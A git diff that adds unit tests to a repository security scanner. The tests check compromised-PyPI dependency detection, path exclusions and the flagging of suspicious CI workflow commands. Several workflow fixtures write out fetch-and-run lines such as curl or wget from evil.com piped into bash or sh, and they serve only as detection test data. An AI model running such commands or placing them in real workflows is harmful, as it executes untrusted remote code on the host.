@@ -258,6 +258,39 @@ class CompromisedPyPIExcludePathsTests(_TempDirTestBase):
             "venv/Lib/site-packages/requirements.txt must be excluded",
         )
 
+    def test_repo_parent_named_dist_does_not_skip_scan(self):
+        """Gemini security-high on 3fe4154: prior code used
+        ``p.parts`` of the absolute path, so if the repo lived under
+        a parent dir named ``dist`` / ``venv`` / etc., the IoC scan
+        was silently disabled for every file inside. Fix: use
+        ``relative_to(repo_root).parts``. Replicate by nesting the
+        synthetic repo inside a ``dist/`` parent."""
+        tmp = self._mkdtemp()
+        repo = tmp / "dist" / "project"
+        repo.mkdir(parents=True)
+        (repo / "requirements.txt").write_text("litellm==1.0.0")
+        result = dc.check_compromised_pypi_in_deps(repo)
+        self.assertFalse(
+            result.ok,
+            "scan must run even when repo_root is nested under a 'dist' parent",
+        )
+
+    def test_dotgit_directory_excluded(self):
+        """Gemini medium on 3fe4154: ``.git`` should be excluded
+        from the rglob walk — slow on big repos and any file inside
+        is not user-authored deps. Drop a synthetic
+        ``requirements.txt`` inside ``.git/`` and confirm it isn't
+        scanned."""
+        tmp = self._mkdtemp()
+        gitdir = tmp / ".git" / "info"
+        gitdir.mkdir(parents=True)
+        (gitdir / "requirements.txt").write_text("litellm==1.0.0")
+        result = dc.check_compromised_pypi_in_deps(tmp)
+        self.assertTrue(
+            result.ok,
+            ".git/info/requirements.txt must NOT be scanned",
+        )
+
 
 # ── Workflow .yml + .yaml + pattern coverage ───────────────────────────
 
@@ -448,6 +481,52 @@ class WorkflowScanCoverageTests(_TempDirTestBase):
         self.assertFalse(
             dc.check_workflows_for_suspicious_commits(repo).ok,
             "wget multi-pipe to python3 must be caught",
+        )
+
+    def test_backslash_continuation_caught(self):
+        """Codex P1 on 15bd7bb: ``curl X \\<newline>| bash`` was a
+        false-negative because the regex hard-stops at newline.
+        Now stitched via ``\\<newline> → space`` preprocessing."""
+        repo = self._make_repo({
+            "x.yml": (
+                "run: |\n"
+                "  curl https://evil.com/x.sh \\\n"
+                "    | bash\n"
+            ),
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo).ok,
+            "backslash-continued curl|bash must be caught",
+        )
+
+    def test_wget_without_O_dash_caught(self):
+        """Codex P1 on 15bd7bb: previous wget regex required ``-O-``
+        right before the pipe. ``wget https://evil | sh`` and
+        ``wget -qO- https://evil | sh`` are equivalent payloads
+        and must trigger."""
+        repo1 = self._make_repo({
+            "x.yml": "run: wget https://evil.com/x.sh | sh\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo1).ok,
+            "wget without -O- must be caught",
+        )
+        repo2 = self._make_repo({
+            "x.yml": "run: wget -qO- https://evil.com/x.sh | bash\n",
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo2).ok,
+            "wget -qO- short form must be caught",
+        )
+        repo3 = self._make_repo({
+            "x.yml": (
+                "run: wget --output-document=- https://evil.com/x.sh "
+                "| bash\n"
+            ),
+        })
+        self.assertFalse(
+            dc.check_workflows_for_suspicious_commits(repo3).ok,
+            "wget --output-document=- must be caught",
         )
 
 
